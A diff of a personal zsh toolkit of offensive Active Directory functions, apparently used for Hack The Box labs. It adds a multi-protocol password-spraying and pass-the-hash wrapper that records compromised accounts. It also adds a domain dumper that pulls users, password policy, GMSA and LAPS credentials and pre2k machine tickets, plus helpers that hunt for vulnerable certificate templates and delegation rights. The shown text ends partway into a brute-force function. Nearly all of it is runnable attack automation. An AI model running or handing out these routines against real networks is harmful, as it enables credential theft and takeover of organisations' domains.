@@ -3,6 +3,7 @@
 alias htb='sudo openvpn /home/damuna/Downloads/lab_Damuna.ovpn'
 alias tunip="ip -o -4 addr show tun0 | awk '{print \$4}' | cut -d'/' -f1"
 alias gettgtpkinit.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/gettgtpkinit.py"
+alias getnthash.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/getnthash.py"
 alias pygpoabuse="/home/damuna/TOOLS/pyGPOAbuse/venv/bin/python3 /home/damuna/TOOLS/pyGPOAbuse/pygpoabuse.py"
 alias randstr="openssl rand -hex 12"
 # TTY upgrade
@@ -73,36 +74,6 @@ udp(){
         echo "NO UDP PORTS FOUND"
     fi
     sudo rm /tmp/$1_UDP.txt
-}
-
-# NXC Spraying Wrapper
-nxcspray(){
-    protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "ssh" "ftp" "wmi" "nfs")
-    for protocol in "${protocols[@]}"; do
-        echo -e "[+] SPRAYING PROTOCOL \"$protocol\" WITH PARAMETERS:\n    HOSTS -> \"$1\"\n    USERS -> \"$2\"\n    CREDS -> \"$3\"\n"
-
-        echo -e "[+] - Domain Authentication"
-        if [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        else
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        fi
-
-        echo -e "[+] - Local Authentication"
-        if [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success --local-auth | grep -v "STATUS_LOGON_FAILURE"
-        else
-            nxc $protocol $1 -u $2 -H $3 --continue-on-success --local-auth | grep -v "STATUS_LOGON_FAILURE"
-        fi
-
-        echo -e "[+] - Kerberos Authentication"
-        read -r dc_fqdn\?"[+] - Input DC FQDN: "
-        if [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        else
-            nxc $protocol $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success | grep -v "STATUS_LOGON_FAILURE"
-        fi
-    done
 }
 
 
@@ -1575,42 +1546,40 @@ addhost() {
 }
 
 
-# AD Realm Setting Function kerberos configuration
+# AD Realm Setting Function
 krbconf(){
-    genhosts $1
+    salt=$(openssl rand -hex 4)
 
-    echo -e "\nCHECKING DC IP\n"
-    dc_ip=$(sudo nmap -p88 $1 -n -Pn --disable-arp-ping -g 53 -T4 --open -oG - | awk '/88\/open/ {print $2}')
-    if [[ -z $dc_ip ]]; then
-        echo -e "DC IP NOT FOUND\n"
-        read -r dc_ip\?"INPUT DC IP TO CONFIGURE DOMAIN: "
+    if [[ -f $1 ]]; then
+        while read ip; do krbconf $ip; done < $1
+        return 1
     fi
 
-    if [[ $(echo $dc_ip | wc -l) != "1" ]]; then
-        echo -e "\nFOUND MULTIPLE DCs: \n"
-        echo $dc_ip | while read ip; do nxc smb $ip; done
-        read -r dc_ip\?"INPUT DC IP TO CONFIGURE DOMAIN: "
-    fi
-
-    echo -e "\nSYNCING TIME WITH DC \"$dc_ip\"\n"
+    echo -e "\n[+] SYNCING TIME WITH DC \"$1\"\n"
     sudo timedatectl set-ntp off
-    timeout 1 sudo ntpdate -s $dc_ip
-    timeout 1 sudo rdate -n $dc_ip
+    timeout 1 sudo ntpdate -s $1
+    timeout 1 sudo rdate -n $1
 
-    echo -e "\nADDING AD REALM FOR \"$dc_ip\"\n"
-    nxc smb $dc_ip --generate-krb5-file /tmp/krb5conf
-    if [[ ! -f /tmp/krb5conf ]]; then
-        echo -e "\nKB GENERATION FAILED, TRY AGAIN OR CHANGE DC\n"
-            return 1
+    echo -e "\n[+] ADDING AD REALM FOR \"$1\"\n"
+    nxc smb $1 --generate-krb5-file /tmp/krb5conf
+    if [[ ! -s /tmp/krb5conf ]]; then
+        read -r manualset\?"[-] KB GENERATION FAILED, COULD NOT CONTACT SMB ON \"$1\", DO YOU STILL WANT TO ADD A REALM? (Y/N): "
+        if [[ $manualset =~ [yY] ]]; then
+            read -r dom\?"[+] INPUT DOMAIN: "
+            read -r dc_fqdn\?"[+] INPUT DC_FQDN: "
+            echo "[libdefaults]\n    dns_lookup_kdc = false\n    dns_lookup_realm = false\n    default_realm = ${dom:u}\n\n[realms]\n    ${dom:u} = {\n        kdc = $dc_fqdn\n        admin_server = $dc_fqdn\n        default_domain = $dom\n    }\n\n[domain_realm]\n    .$dom = ${dom:u}\n    $dom = ${dom:u}" > /tmp/krb5conf
+        fi
+        cat /tmp/krb5conf
+        addhost $1 $dc_fqdn
+        addhost $1 $dom
+    else
+        genhosts $1
     fi
 
     dom=$(cat /tmp/krb5conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
-    domchk=$(cat /etc/resolv.conf | grep "domain $dom")
-    echo -e "\nADDING NS CONFIGURTATION FOR \"$dc_ip\" ON DOMAIN \"$dom\"\n"
+    echo -e "\n[+] ADDING NS CONFIGURTATION FOR \"$1\" ON DOMAIN \"$dom\"\n"
+    echo "\n#---AD GENERATED---#\ndomain $dom\nnameserver $1\n" | sudo tee --append /etc/resolv.conf
 
-    if [[ -z $domchk ]]; then
-        echo "\n#---AD GENERATED---#\ndomain $dom\nnameserver $dc_ip\n" | sudo tee --append /etc/resolv.conf
-    fi
     if [[ -f /etc/krb5.conf ]]; then
         prev_dom=$(cat /etc/krb5.conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
         if [[ ! -z $prev_dom ]]; then
@@ -1630,6 +1599,7 @@ krbconf(){
     else
         sudo mv /tmp/krb5conf /etc/krb5.conf
     fi
+    rm /tmp/krb5conf &>/dev/null
 }
 
 
@@ -2196,4 +2166,520 @@ xssgen() {
 
     echo -e "\n[+] OPENING HTTP SERVER ON \"http://$ip:$lport\"\n"
     python3 -m http.server $lport >/dev/null
+}
+
+
+# NXC Spraying Wrapper
+nxcspray(){
+    protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
+    loc_protocols=("smb" "ldap" "winrm" "rdp" "mssql" "wmi")
+
+    dc_ip=$(sudo nmap -p88 -iL $1 -n -Pn --disable-arp-ping -sT --open -oG - | awk '/88\/open/ {print $2}')
+    if [[ -z $dc_ip ]]; then
+        echo -e "\n[-] DC IP NOT FOUND, ENSURE YOU ARE CONNECTED CORRECTLY TO THE AD\n"
+        exit 1
+    elif [[ $(echo $dc_ip | wc -l) != 1 ]]; then
+        read -r dc_ip\?"[-] MULTIPLE DC IPS DETECTED, INPUT MANUALLY: "
+    fi
+
+    dom=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $3}' | head -n 1)
+    echo -e "\n[+] DOMAIN SET TO \"$dom\"\n"
+
+    dc_fqdn=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $2}' | head -n 1)
+    rm /tmp/spray_$dc_fqdn.txt &>/dev/null
+
+    echo -e "\n[+] - Domain Authentication"
+    for protocol in "${protocols[@]}"; do
+        if [[ $3 == $2 ]]; then
+            echo -e "[+] - USER:USER Mode Detected\n"
+            nxc $protocol $1 -u $2 -p $3 --continue-on-success --no-bruteforce | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | tee -a /tmp/spray_$dc_fqdn.txt
+        elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | tee -a /tmp/spray_$dc_fqdn.txt
+        else
+            nxc $protocol  $1 -u $2 -H $3 --continue-on-success  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | tee -a /tmp/spray_$dc_fqdn.txt
+        fi
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | grep 'Pwn3d!' | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+    done
+
+    echo -e "\n[+] - Local Authentication"
+    for protocol in "${loc_protocols[@]}"; do
+        if [[ $3 == $2 ]]; then
+            echo -e "[+] - USER:USER Mode Detected\n"
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce --local-auth  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" 
+        elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --local-auth  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" 
+        else
+            nxc $protocol  $1 -u $2 -H $3 --continue-on-success --local-auth  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" 
+        fi
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+    done
+
+    echo -e "\n[+] - Kerberos Authentication"
+    for protocol in "${protocols[@]}"; do
+        if [[ $3 == $2 ]]; then
+            echo -e "[+] - USER:USER Mode Detected\n"
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce -k --kdcHost $dc_fqdn  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" 
+        elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
+            nxc $protocol  $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" 
+        else
+            nxc $protocol  $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success  | grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" 
+        fi
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+    done
+}
+
+# NXC Domain Dumper
+domdump(){
+    dom=$(cat /etc/hosts | grep -i $1 | awk '{print $3}' | head -n 1)
+    if [[ -z $3 ]]; then
+        read -r usr_kb\?"[+] BRUTEFORCING MODE DETECTED, INPUT PATH TO USER WORDLIST: "
+        dombrute $1 $usr_kb
+        exit 1
+    fi
+    if [[ -f $3 ]]; then
+        kbload $3
+        echo -e "\n[+] ATTEMPTING RPC DUMPING\n"
+        mkdir -p RPC_DATA && cd RPC_DATA
+        rpcclient --use-kerberos -N $1 -c "querydispinfo" > RPC_USERS_DESCRIPTIONS_$1.txt 2>/dev/null
+        rpcclient --use-kerberos -N $1 -c "getdompwinfo" > RPC_PASS_POL_$1.txt 2>/dev/null
+        rpcclient --use-kerberos -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
+        rpcclient --use-kerberos -N $1 -c "enumprinters" > RPC_PRINTERS_$1.txt 2>/dev/null
+        if [[ -s RPC_USERS_$1.txt ]]; then
+            cat RPC_USERS_$1.txt | anew -q ../users.txt
+            echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
+            cd RPC_DATA
+            while read user; do
+                rpcclient --use-kerberos -N $1 -c "queryuser $user" > RPC_USERS_DATA_$1.txt 2>/dev/null
+            done < ../users.txt
+        fi
+        cd ..
+        find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null
+
+        echo -e "\n[+] CHECKING LDAP SIGNING\n"
+        nxc ldap $1
+
+        echo -e "\n[+] ATTEMPTING LDAP DUMPING\n"
+        mkdir -p LDAP_DATA && cd LDAP_DATA
+        nxc ldap $1 --use-kcache --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
+        nxc ldap $1 --use-kcache --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USER_PROPERTIES_$1.txt
+
+        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+        nxc ldap $1 --use-kcache --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt
+
+        echo -e "\n[+] GMSA / LAPS CREDENTIALS\n"
+        nxc ldap $1 --use-kcache --gmsa
+        nxc ldap $1 --use-kcache -M laps
+
+        echo -e "\n[+] DOMAIN TRUST DATA\n"
+        nxc ldap $1 --use-kcache --dc-list --get-sid
+
+        echo -e "\n[+] GMSA / LAPS CREDENTIALS\n"
+        echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
+        nxc ldap $1 --use-kcache -M pre2k && mkdir -p ../PRE2K_TGT && cp /home/damuna/.nxc/modules/pre2k/ccache/* ../PRE2K_TGT && rmdir ../PRE2K_TGT 2>/dev/null
+        ls -la ../PRE2K_TGT/*.ccache | awk '{print $9}' | awk -F"/" '{print $3}' | cut -d'.' -f1 > /tmp/pre2k && while read pc; do echo "${pc:u}.${dom}" | anew -q ../owned.txt; done < /tmp/pre2k
+
+        cat LDAP_USERS_$1.txt | anew -q ../users.txt
+        cd ..
+        find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null
+
+        if [[ ! -s LDAP_DATA/LDAP_USERS_$1.txt ]]; then
+            echo -e "\n[+] ATTEMPTING SMB DUMPING\n"
+            mkdir -p SMB_DATA && cd SMB_DATA
+            nxc smb $1 --use-kcache --users-export SMB_USERS_$1.txt
+            if [[ -s SMB_USERS_$1.txt ]]; then
+                echo -e "\n[+] FOUND SMB USERS\n"
+                cat SMB_USERS_$1.txt
+                cat SMB_USERS_$1.txt | anew -q ../users.txt
+            fi
+            echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+            nxc smb $1 --use-kcache --pass-pol
+
+            cd ..
+            find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null
+        else
+            delegfind $1 $2 $3
+            certfind $1 $2 $3
+        fi
+
+        echo -e "\n[+] SAVED UNIQUE USERNAMES FOUND IN \"users.txt\"\n"
+        domroast $1 $2 $3
+
+    elif [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        echo -e "\n[+] ATTEMPTING RPC DUMPING\n"
+        mkdir -p RPC_DATA && cd RPC_DATA
+        rpcclient -U $2%$3 -N $1 -c "querydispinfo" > RPC_USERS_DESCRIPTIONS_$1.txt 2>/dev/null
+        rpcclient -U $2%$3 -N $1 -c "getdompwinfo" > RPC_PASS_POL_$1.txt 2>/dev/null
+        rpcclient -U $2%$3 -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
+        rpcclient -U $2%$3 -N $1 -c "enumprinters" > RPC_PRINTERS_$1.txt 2>/dev/null
+
+        if [[ -s RPC_USERS_$1.txt ]]; then
+            cat RPC_USERS_$1.txt | anew -q ../users.txt
+            echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
+            cd RPC_DATA
+            while read user; do
+                rpcclient -U $2%$3 -N $1 -c "queryuser $user" > RPC_USERS_DATA_$1.txt 2>/dev/null
+            done < ../users.txt
+        fi
+        cd ..
+        find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null
+
+        echo -e "\n[+] CHECKING LDAP SIGNING\n"
+        nxc ldap $1
+
+        echo -e "\n[+] ATTEMPTING LDAP DUMPING\n"
+        mkdir -p LDAP_DATA && cd LDAP_DATA
+        nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
+        nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USER_PROPERTIES_$1.txt
+
+        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+        nxc ldap $1 -u $2 -p $3 --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt
+
+        echo -e "\n[+] GMSA / LAPS CREDENTIALS\n"
+        nxc ldap $1 -u $2 -p $3 --gmsa
+        nxc ldap $1 -u $2 -p $3 -M laps
+
+        echo -e "\n[+] DOMAIN TRUST DATA\n"
+        nxc ldap $1 -u $2 -p $3 --dc-list --get-sid
+
+        echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
+        nxc ldap $1 -u $2 -p $3 -M pre2k && mkdir -p ../PRE2K_TGT && cp /home/damuna/.nxc/modules/pre2k/ccache/* ../PRE2K_TGT && rmdir ../PRE2K_TGT 2>/dev/null
+        ls -la ../PRE2K_TGT/*.ccache | awk '{print $9}' | awk -F"/" '{print $3}' | cut -d'.' -f1 > /tmp/pre2k && while read pc; do echo "${pc:u}.${dom}" | anew -q ../owned.txt; done < /tmp/pre2k
+
+        cat LDAP_USERS_$1.txt | anew -q ../users.txt
+        cd ..
+        find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null
+
+        if [[ ! -s LDAP_DATA/LDAP_USERS_$1.txt ]]; then
+            echo -e "\n[+] ATTEMPTING SMB DUMPING\n"
+            mkdir -p SMB_DATA && cd SMB_DATA
+            nxc smb $1 -u $2 -p $3 --users-export SMB_USERS_$1.txt
+            if [[ -s SMB_USERS_$1.txt ]]; then
+                echo -e "\n[+] FOUND SMB USERS\n"
+                cat SMB_USERS_$1.txt
+                cat SMB_USERS_$1.txt | anew -q ../users.txt
+            fi
+            echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+            nxc smb $1 -u $2 -p $3 --pass-pol
+
+            cd ..
+            find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null
+        else
+            delegfind $1 $2 $3
+            certfind $1 $2 $3
+        fi
+
+        echo -e "\n[+] SAVED UNIQUE USERNAMES FOUND IN \"users.txt\"\n"
+        domroast $1 $2 $3
+
+    elif [[ ! -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        echo -e "\n[+] ATTEMPTING RPC DUMPING\n"
+        mkdir -p RPC_DATA && cd RPC_DATA
+        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "querydispinfo" > RPC_USERS_DESCRIPTIONS_$1.txt 2>/dev/null
+        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
+        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "enumprinters" > RPC_PRINTERS_$1.txt 2>/dev/null
+        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "getdompwinfo" > RPC_PASS_POL_$1.txt 2>/dev/null
+        if [[ -s RPC_USERS_$1.txt ]]; then
+            cat RPC_USERS_$1.txt | anew -q ../users.txt
+
+            echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
+            cd RPC_DATA
+            while read user; do
+                rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "queryuser $user" > RPC_USERS_DATA_$1.txt 2>/dev/null
+            done < ../users.txt
+        fi
+        cd ..
+        find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null
+
+        mkdir -p LDAP_DATA && cd LDAP_DATA
+        echo -e "\n[+] CHECKING LDAP SIGNING\n"
+        nxc ldap $1
+
+        echo -e "\n[+] ATTEMPTING LDAP DUMPING\n"
+        nxc ldap $1 -u $2 -H $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
+        nxc ldap $1 -u $2 -H $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USERS_PROPERTIES_$1.txt
+
+        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+        nxc ldap $1 -u $2 -H $3 --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt
+
+        echo -e "\n[+] GMSA / LAPS CREDENTIALS\n"
+        nxc ldap $1 -u $2 -H $3 --gmsa
+        nxc ldap $1 -u $2 -H $3 -M laps
+
+        echo -e "\n[+] DOMAIN TRUST DATA\n"
+        nxc ldap $1 -u $2 -H $3 --dc-list --get-sid
+
+        echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
+        nxc ldap $1 -u $2 -H $3 -M pre2k && mkdir -p ../PRE2K_TGT && cp /home/damuna/.nxc/modules/pre2k/ccache/* ../PRE2K_TGT && rmdir ../PRE2K_TGT 2>/dev/null
+        ls -la ../PRE2K_TGT/*.ccache | awk '{print $9}' | awk -F"/" '{print $3}' | cut -d'.' -f1 > /tmp/pre2k && while read pc; do echo "${pc:u}.${dom}" | anew -q ../owned.txt; done < /tmp/pre2k
+
+        cat LDAP_USERS_$1.txt | anew -q ../users.txt
+        cd ..
+        find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null
+
+        if [[ ! -s LDAP_DATA/LDAP_USERS_$1.txt ]]; then
+            echo -e "\n[+] ATTEMPTING SMB DUMPING\n"
+            mkdir -p SMB_DATA && cd SMB_DATA
+            nxc smb $1 -u $2 -H $3 --users-export SMB_USERS_$1.txt
+            if [[ -s SMB_USERS_$1.txt ]]; then
+                echo -e "\n[+] FOUND SMB USERS\n"
+                cat SMB_USERS_$1.txt
+                cat SMB_USERS_$1.txt | anew -q ../users.txt
+            fi
+            echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+            nxc smb $1 -u $2 -H $3 --pass-pol
+
+            cd ..
+            find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null
+        else
+            delegfind $1 $2 $3
+            certfind $1 $2 $3
+        fi
+
+        echo -e "\n[+] SAVED UNIQUE USERNAMES FOUND IN \"users.txt\"\n"
+        domroast $1 $2 $3
+    fi
+}
+
+# CA Templates Enumeration
+certfind(){
+    echo -e "\n[+] SEARCHING VULNERABLE CA TEMPLATES FROM USER \"$2\"\n"
+    if [[ -f $3 ]]; then
+        kbload $3 >/dev/null
+        dc_fqdn=$(cat /etc/hosts | grep -i $1 | awk '{print $2}' | head -n 1)
+        nxc ldap $1 --use-kcache -M adcs
+        nxc smb $1 --use-kcache -M enum_ca
+        certipy-ad find -u $2 -k -dc-ip $1 -target $dc_fqdn -vulnerable -stdout -enabled -ldap-scheme ldap
+    elif [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        nxc ldap $1 -u $2 -p $3 -M adcs
+        nxc smb $1 -u $2 -p $3 -M enum_ca
+        certipy-ad find -u $2 -p $3 -dc-ip $1 -vulnerable -stdout -enabled -ldap-scheme ldap
+    elif [[ ! -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        nxc ldap $1 -u $2 -H $3 -M adcs
+        nxc smb $1 -u $2 -H $3  -M enum_ca
+        certipy-ad find -u $2 -hashes $3 -dc-ip $1 -vulnerable -stdout -enabled -ldap-scheme ldap
+    fi
+}
+
+# NXC Delegation Finder
+delegfind(){
+    echo -e "\n[+] SEARCHING DELEGATION PRIVILEGES\n"
+    if [[ -f $3 ]]; then
+        kbload $3 >/dev/null
+        nxc ldap $1 --use-kcache --find-delegation
+    elif [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        nxc ldap $1 -u $2 -p $3 --find-delegation
+    elif [[ ! -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        nxc ldap $1 -u $2 -H $3 --find-delegation
+    fi
+}
+
+
+# AD Data Bruteforcer
+dombrute(){
+    echo -e "\n[+] ATTEMPTING BLIND RPC DUMPING\n"
+    mkdir -p RPC_DATA && cd RPC_DATA
